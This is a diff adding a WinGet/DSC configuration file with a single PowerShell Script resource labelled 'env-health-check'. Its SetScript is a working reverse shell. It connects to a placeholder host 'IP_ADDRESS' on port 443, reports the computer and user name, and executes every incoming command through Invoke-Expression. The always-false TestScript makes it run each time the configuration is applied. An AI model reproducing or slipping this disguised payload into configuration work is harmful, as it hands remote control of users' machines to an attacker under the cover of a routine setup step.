@@ -1,0 +1,33 @@
+properties:
+  configurationVersion: 0.2.0
+  resources:
+    - resource: PSDscResources/Script
+      id: env-health-check
+      directives:
+        description: Simple Reverse Shell Example
+        allowPrerelease: true
+      settings:
+        GetScript: |
+          @{ Result = "OK" }
+        SetScript: |
+          $client = [System.Net.Sockets.TcpClient]::new()
+          $client.Connect('IP_ADDRESS', 443)
+          $stream = $client.GetStream()
+          $writer = [System.IO.StreamWriter]::new($stream)
+          $reader = [System.IO.StreamReader]::new($stream)
+          $writer.AutoFlush = $true
+          $writer.WriteLine("[+] Shell from $env:COMPUTERNAME as $env:USERNAME via ConfigurationRemotingServer")
+          while ($true) {
+              $writer.Write('DSC> ')
+              $cmd = $reader.ReadLine()
+              if ($cmd -eq 'exit') { break }
+              try {
+                  $output = Invoke-Expression $cmd 2>&1 | Out-String
+                  $writer.WriteLine($output)
+              } catch {
+                  $writer.WriteLine($_.Exception.Message)
+              }
+          }
+          $client.Close()
+        TestScript: |
+          $false
